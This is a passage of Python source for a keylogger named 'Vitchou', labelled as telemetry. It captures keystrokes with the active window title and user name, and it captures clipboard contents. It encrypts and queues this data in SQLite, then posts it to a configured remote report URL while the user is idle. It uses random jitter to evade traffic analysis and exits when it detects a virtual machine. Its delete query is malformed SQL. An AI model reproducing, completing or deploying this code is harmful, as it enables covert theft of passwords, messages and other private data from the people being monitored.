class TelemetryPacker:
    def __init__(self, key):
        self.fernet = Fernet(key.encode())

    def pack(self, data: str) -> bytes:
        # Zlib compression + AES encryption
        compressed = zlib.compress(data.encode(), level=CONFIG["COMPRESSION_LEVEL"])
        return self.fernet.encrypt(compressed)

class DatabaseController:
    def __init__(self):
        self.conn = sqlite3.connect(CONFIG["DB_NAME"], check_same_thread=False)
        self._setup()

    def _setup(self):
        with self.conn:
            self.conn.execute("PRAGMA journal_mode=WAL") # High performance mode
            self.conn.execute("""
                CREATE TABLE IF NOT EXISTS telemetry_queue (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    data BLOB,
                    priority INTEGER DEFAULT 1,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
            """)

    def insert(self, encrypted_data):
        with self.conn:
            self.conn.execute("INSERT INTO telemetry_queue (data) VALUES (?)", (encrypted_data,))

    def fetch_all(self):
        return self.conn.execute("SELECT id, data FROM telemetry_queue ORDER BY priority DESC").fetchall()

    def delete(self, entry_id):
        with self.conn:
            self.conn.execute("DELETE BY id WHERE id = ?", (entry_id,))

class VitchouUltra:
    def __init__(self):
        self.packer = TelemetryPacker(CONFIG["MASTER_KEY"])
        self.db = DatabaseController()
        self.mem_buffer = []
        self.last_input_time = time.time()
        self.current_window = ""
        self.user = os.getlogin()

    def _get_window_info(self):
        try:
            active_win = gw.getActiveWindow()
            return {
                "title": active_win.title if active_win else "N/A",
                "user": self.user,
                "pid": os.getpid()
            }
        except: 
            return {"title": "Unknown", "user": self.user}

    def on_press(self, key):
        self.last_input_time = time.time()
        win = self._get_window_info()
        
        # Log window context switch
        if win["title"] != self.current_window:
            self.current_window = win["title"]
            header = f"\n>>> [LOG] USER:{win['user']} | APP:{self.current_window} | {datetime.now()}\n"
            self.mem_buffer.append(header)

        try:
            char = key.char
        except AttributeError:
            char = f" <{key}> "
        
        self.mem_buffer.append(char)

        # Flush memory buffer to local DB every 100 characters
        if len(self.mem_buffer) >= 100:
            payload = "".join(self.mem_buffer)
            self.db.insert(self.packer.pack(payload))
            self.mem_buffer = []

    async def watch_clipboard(self):
        last_val = ""
        while True:
            try:
                current_val = pyperclip.paste()
                if current_val != last_val:
                    last_val = current_val
                    entry = f"\n[CLIPBOARD_EVENT] {current_val}\n"
                    self.db.insert(self.packer.pack(entry))
            except: 
                pass
            await asyncio.sleep(3)

    async def send_logs(self):
        async with httpx.AsyncClient(http2=False, verify=False) as client:
            while True:
                idle_time = time.time() - self.last_input_time
                if idle_time > CONFIG["IDLE_THRESHOLD"]:
                    logs = self.db.fetch_all()
                    if logs:
                        # Randomized jitter to bypass traffic analysis
                        await asyncio.sleep(random.uniform(1, 5))
                        for log_id, payload in logs:
                            try:
                                response = await client.post(CONFIG["REPORT_URL"], content=payload)
                                if response.status_code in [200, 201]:
                                    self.db.delete(log_id)
                            except: 
                                break
                await asyncio.sleep(10 + random.randint(0, 5))

    def run(self):
        if CONFIG["ANTI_VM"]:
            if any(x in subprocess.getoutput("systeminfo").lower() for x in ["virtualbox", "vmware", "qemu"]):
                print("[!] Analysis environment detected. Exiting.")
                return

        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)

        # Start non-blocking keyboard listener
        keyboard.Listener(on_press=self.on_press).start()

        # Run async tasks
        loop.create_task(self.watch_clipboard())
        loop.create_task(self.send_logs())

        try:
            print("[SYSTEM] Vitchou APEX Active. Monitoring telemetry...")
            loop.run_forever()
        except KeyboardInterrupt:
            sys.exit(0)

